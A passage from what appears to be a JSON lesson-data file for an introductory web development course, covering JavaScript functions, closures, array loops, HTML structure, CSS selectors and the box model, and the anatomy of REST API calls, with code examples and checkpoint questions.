value is `undefined`."},{"kind":"code","lang":"js","code":"function foo(n) {\n  var s = 0;\n  for (let i = 0; i \u003c n; i++) { s += i; }\n  // no return statement\n}\nconsole.log(foo(3)); // undefined"},{"kind":"p","html":"The loop runs and \u003ccode\u003es\u003c/code\u003e accumulates correctly, but \u003ccode\u003eundefined\u003c/code\u003e is what reaches \u003ccode\u003econsole.log\u003c/code\u003e.","text":"The loop runs and `s` accumulates correctly, but `undefined` is what reaches `console.log`."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eOmitting \u003ccode\u003ereturn\u003c/code\u003e does not log the last computed value — it logs \u003ccode\u003eundefined\u003c/code\u003e. \u003ccode\u003econsole.log(foo(3))\u003c/code\u003e where \u003ccode\u003efoo\u003c/code\u003e has no \u003ccode\u003ereturn\u003c/code\u003e prints \u003ccode\u003eundefined\u003c/code\u003e, not \u003ccode\u003e3\u003c/code\u003e. ISAQuiz3 tests this directly.\u003c/p\u003e","text":"Omitting `return` does not log the last computed value — it logs `undefined`. `console.log(foo(3))` where `foo` has no `return` prints `undefined`, not `3`. ISAQuiz3 tests this directly."},{"kind":"h2","html":"First-class functions","text":"First-class functions"},{"kind":"p","html":"JavaScript treats functions as first-class values. You can assign a function to a variable, pass it as an argument, or return it from another function.","text":"JavaScript treats functions as first-class values. You can assign a function to a variable, pass it as an argument, or return it from another function."},{"kind":"code","lang":"js","code":"const double = function(n) { return n * 2; };\n[1, 2, 3].map(double); // [2, 4, 6]"},{"kind":"p","html":"A \u003cstrong\u003ehigher-order function\u003c/strong\u003e either accepts a function as an argument or returns a function. \u003ccode\u003eArray.map\u003c/code\u003e, \u003ccode\u003eArray.filter\u003c/code\u003e, and \u003ccode\u003eArray.forEach\u003c/code\u003e are all higher-order functions.","text":"A **higher-order function** either accepts a function as an argument or returns a function. `Array.map`, `Array.filter`, and `Array.forEach` are all higher-order functions."},{"kind":"h2","html":"Callbacks","text":"Callbacks"},{"kind":"p","html":"A \u003cstrong\u003ecallback\u003c/strong\u003e is a function passed as an argument to another function. The receiving function calls it later — either synchronously or asynchronously.","text":"A **callback** is a function passed as an argument to another function. The receiving function calls it later — either synchronously or asynchronously."},{"kind":"code","lang":"js","code":"function applyTwice(fn, value) {\n  return fn(fn(value));\n}\napplyTwice(double, 3); // 12"},{"kind":"checkpoint","q":"What does `applyTwice(double, 3)` return if `double` is defined as `n =\u003e n * 2`?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"`12`. `double(3)` returns `6`. `double(6)` returns `12`.\n\u003c/details\u003e"},{"kind":"h2","html":"Closures","text":"Closures"},{"kind":"p","html":"A \u003cstrong\u003eclosure\u003c/strong\u003e is a function that retains access to variables from its enclosing scope after that scope has exited.","text":"A **closure** is a function that retains access to variables from its enclosing scope after that scope has exited."},{"kind":"code","lang":"js","code":"function hiGenerator(greeting) {\n  return function(name) {\n    return greeting + ', ' + name;\n  };\n}\nconst sayHi = hiGenerator('Hello');\nconsole.log(sayHi('World')); // Hello, World"},{"kind":"p","html":"\u003ccode\u003ehiGenerator\u003c/code\u003e returns an inner function. That inner function closes over \u003ccode\u003egreeting\u003c/code\u003e. When you call \u003ccode\u003esayHi(&#39;World&#39;)\u003c/code\u003e, \u003ccode\u003egreeting\u003c/code\u003e is still \u003ccode\u003e&#39;Hello&#39;\u003c/code\u003e even though \u003ccode\u003ehiGenerator\u003c/code\u003e has already returned.","text":"`hiGenerator` returns an inner function. That inner function closes over `greeting`. When you call `sayHi('World')`, `greeting` is still `'Hello'` even though `hiGenerator` has already returned."},{"kind":"checkpoint","q":"Why does `sayHi('World')` still have access to `greeting` after `hiGenerator` has returned?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"Because `sayHi` is a closure. The inner function captures a reference to `greeting` from its enclosing scope. JavaScript keeps that variable alive as long as the closure references it.\n\u003c/details\u003e"},{"kind":"h2","html":"Discarded return values","text":"Discarded return values"},{"kind":"p","html":"Calling a function without capturing or logging its return value silently discards it.","text":"Calling a function without capturing or logging its return value silently discards it."},{"kind":"code","lang":"js","code":"function checkString(s) { return s === \"John\"; }\ncheckString(\"John\"); // returns true — nothing is printed"},{"kind":"p","html":"The function returns \u003ccode\u003etrue\u003c/code\u003e, but no output appears because there is no \u003ccode\u003econsole.log\u003c/code\u003e at the call site.","text":"The function returns `true`, but no output appears because there is no `console.log` at the call site."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003echeckString(&quot;John&quot;)\u003c/code\u003e returns \u003ccode\u003etrue\u003c/code\u003e but prints \u003cstrong\u003enothing\u003c/strong\u003e. The return value is discarded when no \u003ccode\u003econsole.log\u003c/code\u003e wraps the call. ISAQuiz3 tests this pattern.\u003c/p\u003e","text":"`checkString(\"John\")` returns `true` but prints **nothing**. The return value is discarded when no `console.log` wraps the call. ISAQuiz3 tests this pattern."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Every function returns a value — either the value after \u003ccode\u003ereturn\u003c/code\u003e, or \u003ccode\u003eundefined\u003c/code\u003e if there is no \u003ccode\u003ereturn\u003c/code\u003e. Parameters are definition-site names; arguments are call-site values. Closures keep enclosing-scope variables alive.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":12,"id":"js-arrays-loops","title":"Arrays, Loops, and Iteration Patterns","hook":"Assigning to arr[1] without touching arr[0] leaves a silent hole — reading arr[0] returns undefined, not an error.","tags":["arrays","for-loop","iteration","index"],"module":"JavaScript Foundations and Web Basics","source":"ISAQuiz2","blocks":[{"kind":"p","html":"Assigning a value to index 1 without assigning index 0 creates a sparse array. Reading the unassigned slot returns \u003ccode\u003eundefined\u003c/code\u003e, not an error.","text":"Assigning a value to index 1 without assigning index 0 creates a sparse array. Reading the unassigned slot returns `undefined`, not an error."},{"kind":"code","lang":"js","code":"let arr = [];\narr[1] = 1234;\nconsole.log(arr[0]); // undefined — slot 0 was never written"},{"kind":"p","html":"Arrays in JavaScript are objects. Any integer key you skip stays uninitialized, and uninitialized slots read as \u003ccode\u003eundefined\u003c/code\u003e.","text":"Arrays in JavaScript are objects. Any integer key you skip stays uninitialized, and uninitialized slots read as `undefined`."},{"kind":"h2","html":"Indexing with \u003ccode\u003earr.length\u003c/code\u003e","text":"Indexing with `arr.length`"},{"kind":"p","html":"\u003ccode\u003earr.length\u003c/code\u003e equals the count of slots, not the last valid index. The last valid index is always \u003ccode\u003earr.length - 1\u003c/code\u003e.","text":"`arr.length` equals the count of slots, not the last valid index. The last valid index is always `arr.length - 1`."},{"kind":"code","lang":"js","code":"const arr = ['a', 'b', 'c', 'd', 'e', 'f']; // 6 elements\nconsole.log(arr[arr.length / 2]); // arr[3] = 'd'\nconsole.log(arr[arr.length - 2]); // arr[4] = 'e'  ← second-to-last"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eUsing \u003ccode\u003ei &lt;= arr.length\u003c/code\u003e in a loop lets \u003ccode\u003ei\u003c/code\u003e reach \u003ccode\u003earr.length\u003c/code\u003e. That slot does not exist. You read \u003ccode\u003eundefined\u003c/code\u003e on the final iteration. Always use \u003ccode\u003ei &lt; arr.length\u003c/code\u003e.\u003c/p\u003e","text":"Using `i \u003c= arr.length` in a loop lets `i` reach `arr.length`. That slot does not exist. You read `undefined` on the final iteration. Always use `i \u003c arr.length`."},{"kind":"h2","html":"\u003ccode\u003efor\u003c/code\u003e loops — boundary and direction","text":"`for` loops — boundary and direction"},{"kind":"p","html":"A standard ascending loop runs from index \u003ccode\u003e0\u003c/code\u003e up to but not including \u003ccode\u003earr.length\u003c/code\u003e.","text":"A standard ascending loop runs from index `0` up to but not including `arr.length`."},{"kind":"code","lang":"js","code":"const arr = [1, 2, 3];\nfor (let i = 0; i \u003c arr.length; i++) {\n  console.log(arr[i]); // 1, 2, 3\n}"},{"kind":"p","html":"A descending loop includes both the starting and ending values.","text":"A descending loop includes both the starting and ending values."},{"kind":"code","lang":"js","code":"for (let i = 5; i \u003e= 0; i--) {\n  console.log(i); // 5, 4, 3, 2, 1, 0  ← both endpoints included\n}"},{"kind":"p","html":"\u003ccode\u003ebreak\u003c/code\u003e exits the loop immediately. The body does not execute for the iteration that triggers \u003ccode\u003ebreak\u003c/code\u003e.","text":"`break` exits the loop immediately. The body does not execute for the iteration that triggers `break`."},{"kind":"code","lang":"js","code":"for (let i = 0; i \u003c 5; i++) {\n  if (i === 2) break;\n  console.log(i); // 0, 1  ← stops before i reaches 2\n}"},{"kind":"h2","html":"Nested loops and total iterations","text":"Nested loops and total iterations"},{"kind":"p","html":"Two nested loops of length \u003ccode\u003em\u003c/code\u003e and \u003ccode\u003en\u003c/code\u003e produce \u003ccode\u003em × n\u003c/code\u003e total iterations.","text":"Two nested loops of length `m` and `n` produce `m × n` total iterations."},{"kind":"code","lang":"js","code":"for (let i = 0; i \u003c 3; i++) {\n  for (let j = 0; j \u003c 3; j++) {\n    console.log(i, j); // 9 pairs total\n  }\n}"},{"kind":"checkpoint","q":"What does the following print?\n```js\nconst arr = [10, 20, 30];\nfor (let i = 0; i \u003c 3; i++) {\n  console.log(arr[i - i]);\n}\n```\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"`10`, `10`, `10` — `i - i` is always `0`, so every iteration reads `arr[0]`.\n\u003c/details\u003e"},{"kind":"h2","html":"Accumulator pattern","text":"Accumulator pattern"},{"kind":"p","html":"Accumulators collect a running total across iterations. The loop condition determines how many times the accumulator updates.","text":"Accumulators collect a running total across iterations. The loop condition determines how many times the accumulator updates."},{"kind":"code","lang":"js","code":"let acc = 0;\nfor (let i = 0; i \u003c= 2; i++) {\n  acc += 2;\n}\nconsole.log(acc); // 6 — three iterations: i = 0, 1, 2"},{"kind":"p","html":"Count the iterations carefully. \u003ccode\u003ei &lt;= 2\u003c/code\u003e runs when \u003ccode\u003ei\u003c/code\u003e is \u003ccode\u003e0\u003c/code\u003e, \u003ccode\u003e1\u003c/code\u003e, and \u003ccode\u003e2\u003c/code\u003e — that is three times, not two.","text":"Count the iterations carefully. `i \u003c= 2` runs when `i` is `0`, `1`, and `2` — that is three times, not two."},{"kind":"h2","html":"Nested arrays","text":"Nested arrays"},{"kind":"p","html":"Access a nested array element with two bracket expressions: the first selects the outer array, the second selects within it.","text":"Access a nested array element with two bracket expressions: the first selects the outer array, the second selects within it."},{"kind":"code","lang":"js","code":"const names = [['Alice', 'Bob'], ['Carol', 'Dave'], ['Eve', 'Frank']];\nconsole.log(names[2][1]); // 'Frank'"},{"kind":"p","html":"\u003ccode\u003enames[2]\u003c/code\u003e is \u003ccode\u003e[&#39;Eve&#39;, &#39;Frank&#39;]\u003c/code\u003e. Index \u003ccode\u003e1\u003c/code\u003e of that sub-array is \u003ccode\u003e&#39;Frank&#39;\u003c/code\u003e.","text":"`names[2]` is `['Eve', 'Frank']`. Index `1` of that sub-array is `'Frank'`."},{"kind":"h2","html":"Truncating with \u003ccode\u003earr.length\u003c/code\u003e","text":"Truncating with `arr.length`"},{"kind":"p","html":"Setting \u003ccode\u003earr.length\u003c/code\u003e to a smaller value deletes every element from that index onward. The deletion is permanent and silent.","text":"Setting `arr.length` to a smaller value deletes every element from that index onward. The deletion is permanent and silent."},{"kind":"code","lang":"js","code":"const arr = [1, 2, 3, 4, 5, 6];\narr.length = 4;\nconsole.log(arr); // [1, 2, 3, 4]"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003eparseInt(&quot;Hello123&quot;)\u003c/code\u003e returns \u003ccode\u003eNaN\u003c/code\u003e. \u003ccode\u003eparseInt\u003c/code\u003e reads left-to-right and stops at the first character that is not a valid digit. When the string starts with a letter, no digit is found, so the result is \u003ccode\u003eNaN\u003c/code\u003e.\u003c/p\u003e","text":"`parseInt(\"Hello123\")` returns `NaN`. `parseInt` reads left-to-right and stops at the first character that is not a valid digit. When the string starts with a letter, no digit is found, so the result is `NaN`."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e Off-by-one errors in loop boundaries and unassigned sparse array slots are the two most common sources of \u003ccode\u003eundefined\u003c/code\u003e in JavaScript array code. Use \u003ccode\u003ei &lt; arr.length\u003c/code\u003e, not \u003ccode\u003ei &lt;= arr.length\u003c/code\u003e, and always assign every index you intend to read.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":13,"id":"html-css-review","title":"HTML DOM Structure, CSS Box Model, Selectors, and Attributes","hook":"Every layout bug you'll ever fight traces back to one of four box-model layers or one misread selector rule.","tags":["HTML","CSS","DOM","box-model","selectors"],"module":"JavaScript Foundations and Web Basics","source":"Slide 1, ISAQuiz1","blocks":[{"kind":"h2","html":"The CSS Box Model","text":"The CSS Box Model"},{"kind":"p","html":"Every HTML element is a rectangle made of four concentric layers. The browser sizes and spaces elements using this model.","text":"Every HTML element is a rectangle made of four concentric layers. The browser sizes and spaces elements using this model."},{"kind":"mermaid","source":"graph TD\n  M[\"margin (outermost — transparent space between elements)\"]\n  B[\"border (visible edge around the element)\"]\n  P[\"padding (space between border and content)\"]\n  C[\"content (text, images, child elements)\"]\n  M --\u003e B --\u003e P --\u003e C"},{"kind":"p","html":"The \u003ccode\u003ewidth\u003c/code\u003e and \u003ccode\u003eheight\u003c/code\u003e properties (by default) size only the \u003cstrong\u003econtent\u003c/strong\u003e layer. Padding and border add to the total rendered size unless you set \u003ccode\u003ebox-sizing: border-box\u003c/code\u003e.","text":"The `width` and `height` properties (by default) size only the **content** layer. Padding and border add to the total rendered size unless you set `box-sizing: border-box`."},{"kind":"checkpoint","q":"List the CSS box model layers from inside to outside.\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"content → padding → border → margin\n\u003c/details\u003e"},{"kind":"h2","html":"HTML Document Structure","text":"HTML Document Structure"},{"kind":"p","html":"A valid HTML document has a strict skeleton. The browser builds the DOM from this skeleton.","text":"A valid HTML document has a strict skeleton. The browser builds the DOM from this skeleton."},{"kind":"code","lang":"html","code":"\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n  \u003chead\u003e\n    \u003ctitle\u003ePage Title\u003c/title\u003e\n    \u003clink rel=\"stylesheet\" href=\"styles.css\"\u003e\n  \u003c/head\u003e\n  \u003cbody\u003e\n    \u003cp\u003eVisible content goes here.\u003c/p\u003e\n  \u003c/body\u003e\n\u003c/html\u003e"},{"kind":"p","html":"Key rules:","text":"Key rules:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e&lt;!DOCTYPE html&gt;\u003c/code\u003e must appear \u003cstrong\u003ebefore\u003c/strong\u003e \u003ccode\u003e&lt;html&gt;\u003c/code\u003e — it is not an element, it is a declaration.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e&lt;head&gt;\u003c/code\u003e and \u003ccode\u003e&lt;body&gt;\u003c/code\u003e are direct children of \u003ccode\u003e&lt;html&gt;\u003c/code\u003e. Neither is a child of the other.\u003c/li\u003e\n\u003cli\u003eLoose text placed directly inside \u003ccode\u003e&lt;body&gt;\u003c/code\u003e renders normally.\u003c/li\u003e\n\u003cli\u003eEvery container element that has an opening tag requires a matching closing tag (e.g., \u003ccode\u003e&lt;/table&gt;\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e","text":"- `\u003c!DOCTYPE html\u003e` must appear **before** `\u003chtml\u003e` — it is not an element, it is a declaration.\n- `\u003chead\u003e` and `\u003cbody\u003e` are direct children of `\u003chtml\u003e`. Neither is a child of the other.\n- Loose text placed directly inside `\u003cbody\u003e` renders normally.\n- Every container element that has an opening tag requires a matching closing tag (e.g., `\u003c/table\u003e`)."},{"kind":"checkpoint","q":"Where do `\u003chead\u003e` and `\u003cbody\u003e` sit in the HTML document tree?\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"Both are direct children of `\u003chtml\u003e`. `\u003chead\u003e` comes first; `\u003cbody\u003e` follows.\n\u003c/details\u003e"},{"kind":"h2","html":"CSS Selectors","text":"CSS Selectors"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eSelector form\u003c/th\u003e\n\u003cth\u003eExample\u003c/th\u003e\n\u003cth\u003eWhat it matches\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eElement\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ep { }\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAll \u003ccode\u003e&lt;p&gt;\u003c/code\u003e elements\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eClass\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e.container { }\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAll elements with \u003ccode\u003eclass=&quot;container&quot;\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eElement + class\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ediv.container { }\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&lt;div&gt;\u003c/code\u003e elements that also have class \u003ccode\u003econtainer\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eGrouping\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eh1, h2, p { }\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAll \u003ccode\u003e&lt;h1&gt;\u003c/code\u003e, \u003ccode\u003e&lt;h2&gt;\u003c/code\u003e, and \u003ccode\u003e&lt;p&gt;\u003c/code\u003e elements\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDescendant\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eh1 h2 p { }\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&lt;p&gt;\u003c/code\u003e nested inside \u003ccode\u003e&lt;h2&gt;\u003c/code\u003e nested inside \u003ccode\u003e&lt;h1&gt;\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"Multiple classes on a single element use \u003cstrong\u003espace separation\u003c/strong\u003e in the HTML attribute: \u003ccode\u003eclass=&quot;one two&quot;\u003c/code\u003e.","text":"Multiple classes on a single element use **space separation** in the HTML attribute: `class=\"one two\"`."},{"kind":"checkpoint","q":"Write a single CSS rule that sets the color of `\u003ch1\u003e`, `\u003ch2\u003e`, and `\u003cp\u003e` to red.\n\u003cdetails\u003e\n\u003csummary\u003eShow answer\u003c/summary\u003e","a":"`h1, h2, p { color: red; }` — commas group selectors. Without the comma, `h1 h2 p` selects a `\u003cp\u003e` inside an `\u003ch2\u003e` inside an `\u003ch1\u003e`.\n\u003c/details\u003e"},{"kind":"h2","html":"Stylesheet Delivery Methods","text":"Stylesheet Delivery Methods"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eType\u003c/th\u003e\n\u003cth\u003eSyntax\u003c/th\u003e\n\u003cth\u003eLocation\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eExternal\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eInside \u003ccode\u003e&lt;head&gt;\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eInternal\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&lt;style&gt; p { color: red; } &lt;/style&gt;\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eInside \u003ccode\u003e&lt;head&gt;\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eInline\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e&lt;p style=&quot;color: red;&quot;&gt;\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eOn the element itself\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"h2","html":"HTML Attributes","text":"HTML Attributes"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e&lt;img src=&quot;photo.jpg&quot; alt=&quot;Description&quot;&gt;\u003c/code\u003e — \u003ccode\u003esrc\u003c/code\u003e points to the image file; \u003ccode\u003ealt\u003c/code\u003e provides fallback text.\u003c/li\u003e\n\u003cli\u003eBoth single quotes and double quotes are valid: \u003ccode\u003esrc=&quot;image.jpg&quot;\u003c/code\u003e and \u003ccode\u003esrc=&#39;image.jpg&#39;\u003c/code\u003e both work.\u003c/li\u003e\n\u003c/ul\u003e","text":"- `\u003cimg src=\"photo.jpg\" alt=\"Description\"\u003e` — `src` points to the image file; `alt` provides fallback text.\n- Both single quotes and double quotes are valid: `src=\"image.jpg\"` and `src='image.jpg'` both work."},{"kind":"h2","html":"Common CSS Properties","text":"Common CSS Properties"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eProperty\u003c/th\u003e\n\u003cth\u003eEffect\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ecolor\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eChanges \u003cstrong\u003etext\u003c/strong\u003e color\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ebackground-color\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eChanges the element&#39;s \u003cstrong\u003ebackground\u003c/strong\u003e color\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003efont-size\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eSets text size (accepts \u003ccode\u003epx\u003c/code\u003e, \u003ccode\u003eem\u003c/code\u003e, \u003ccode\u003e%\u003c/code\u003e)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003e\u003ccode\u003ecolor\u003c/code\u003e and \u003ccode\u003ebackground-color\u003c/code\u003e are different properties. Writing \u003ccode\u003ecolor: blue\u003c/code\u003e on a \u003ccode\u003e&lt;div&gt;\u003c/code\u003e turns the \u003cstrong\u003etext\u003c/strong\u003e blue, not the background. To set the background, use \u003ccode\u003ebackground-color: blue\u003c/code\u003e. ISAQuiz1 tests this distinction directly.\u003c/p\u003e","text":"`color` and `background-color` are different properties. Writing `color: blue` on a `\u003cdiv\u003e` turns the **text** blue, not the background. To set the background, use `background-color: blue`. ISAQuiz1 tests this distinction directly."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eA comma in a selector groups elements: \u003ccode\u003eh1, p { }\u003c/code\u003e targets both \u003ccode\u003e&lt;h1&gt;\u003c/code\u003e and \u003ccode\u003e&lt;p&gt;\u003c/code\u003e. Without the comma, \u003ccode\u003eh1 p { }\u003c/code\u003e selects a \u003ccode\u003e&lt;p&gt;\u003c/code\u003e descendant of \u003ccode\u003e&lt;h1&gt;\u003c/code\u003e — a completely different rule.\u003c/p\u003e","text":"A comma in a selector groups elements: `h1, p { }` targets both `\u003ch1\u003e` and `\u003cp\u003e`. Without the comma, `h1 p { }` selects a `\u003cp\u003e` descendant of `\u003ch1\u003e` — a completely different rule."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eTakeaway:\u003c/strong\u003e The box model (content → padding → border → margin) governs every element&#39;s size and spacing. Selector commas group targets; spaces express ancestry. \u003ccode\u003ecolor\u003c/code\u003e sets text; \u003ccode\u003ebackground-color\u003c/code\u003e sets background.\u003c/p\u003e\n\u003c/blockquote\u003e"}]},{"n":14,"id":"rest-anatomy","title":"Anatomy of Web APIs","hook":"An API server that returns JSON instead of HTML stays stable even when the UI redesigns — here is how every part of that contract is structured.","tags":["REST","API","endpoint","headers","HTTP-methods","status-code"],"module":"Web Architecture and Data Exchange","source":"Slide 3, Slide 8, Quiz 6, Quiz 7","blocks":[{"kind":"h2","html":"The problem HTML scraping creates","text":"The problem HTML scraping creates"},{"kind":"p","html":"Imagine you scrape IMDB for movie ratings. Your scraper reads the HTML, parses it, and extracts the data you need. Then IMDB redesigns their page. Your scraper breaks — every selector is wrong.","text":"Imagine you scrape IMDB for movie ratings. Your scraper reads the HTML, parses it, and extracts the data you need. Then IMDB redesigns their page. Your scraper breaks — every selector is wrong."},{"kind":"p","html":"The solution is an API server that returns JSON or XML. The rule of thumb is: OMDb does not change what a given URL returns. The structure of the data stays stable even when the UI changes. That stability is why web APIs exist.","text":"The solution is an API server that returns JSON or XML. The rule of thumb is: OMDb does not change what a given URL returns. The structure of the data stays stable even when the UI changes. That stability is why web APIs exist."},{"kind":"h2","html":"The four parts of a web API call","text":"The four parts of a web API call"},{"kind":"p","html":"Every API call has four components: headers, body, endpoint, and HTTP method.","text":"Every API call has four components: headers, body, endpoint, and HTTP method."},{"kind":"h3","html":"1. Endpoint","text":"1. Endpoint"},{"kind":"p","html":"The endpoint is the URL where the API server is listening. It is the address you send your request to.","text":"The endpoint is the URL where the API server is listening. It is the address you send your request to."},{"kind":"p","html":"Example: \u003ccode\u003ehttps://api.example.com/v1/patients/\u003c/code\u003e","text":"Example: `https://api.example.com/v1/patients/`"},{"kind":"h3","html":"2. Headers","text":"2. Headers"},{"kind":"p","html":"Headers carry additional details for client-server communication.","text":"Headers carry additional details for client-server communication."},{"kind":"p","html":"\u003cstrong\u003eRequest headers\u003c/strong\u003e include:","text":"**Request headers** include:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eAPI-key\u003c/code\u003e — a subscription key so the server knows who is making the request\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecount\u003c/code\u003e — the number of objects you want\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003epageNo\u003c/code\u003e — which page of results to return\u003c/li\u003e\n\u003c/ul\u003e","text":"- `API-key` — a subscription key so the server knows who is making the request\n- `count` — the number of objects you want\n- `pageNo` — which page of results to return"},{"kind":"p","html":"\u003cstrong\u003eResponse headers\u003c/strong\u003e include:","text":"**Response headers** include:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003estatus\u003c/code\u003e — the HTTP status code\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econtent-type\u003c/code\u003e — the type of resource being returned (e.g., \u003ccode\u003etext/html\u003c/code\u003e, \u003ccode\u003eimage/png\u003c/code\u003e, \u003ccode\u003eapplication/json\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e","text":"- `status` — the HTTP status code\n- `content-type` — the type of resource being returned (e.g., `text/html`, `image/png`, `application/json`)"},{"kind":"h3","html":"3. Body (Data)","text":"3. Body (Data)"},{"kind":"p","html":"The body contains the information you want to send to the server. A POST request creating a new patient sends the patient&#39;s data in the body. A GET request has no body.","text":"The body contains the information you want to send to the server. A POST request creating a new patient sends the patient's data in the body. A GET request has no body."},{"kind":"h3","html":"4. HTTP Methods","text":"4. HTTP Methods"},{"kind":"p","html":"The HTTP method tells the server what action to perform on the resource.","text":"The HTTP method tells the server what action to perform on the resource."},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMethod\u003c/th\u003e\n\u003cth\u003eAction\u003c/th\u003e\n\u003cth\u003eIdempotent?\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003eRetrieve a resource; should only retrieve data\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePOST\u003c/td\u003e\n\u003ctd\u003eCreate a new resource instance\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePUT\u003c/td\u003e\n\u003ctd\u003eReplace the entire resource at a URI\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePATCH\u003c/td\u003e\n\u003ctd\u003eUpdate one or more fields of a resource\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDELETE\u003c/td\u003e\n\u003ctd\u003eDelete the specified resource\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eHEAD\u003c/td\u003e\n\u003ctd\u003eSame as GET but without a response body\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"An operation is idempotent if applying it multiple times produces the same result as applying it once. PUT replaces the entire resource; PATCH updates a single property.","text":"An operation is idempotent if applying it multiple times produces the same result as applying it once. PUT replaces the entire resource; PATCH updates a single property."},{"kind":"h2","html":"GET vs POST: behavioral differences","text":"GET vs POST: behavioral differences"},{"kind":"p","html":"GET is simpler and faster, and handles most read operations. But GET and POST behave differently in several ways you need to know for the exam.","text":"GET is 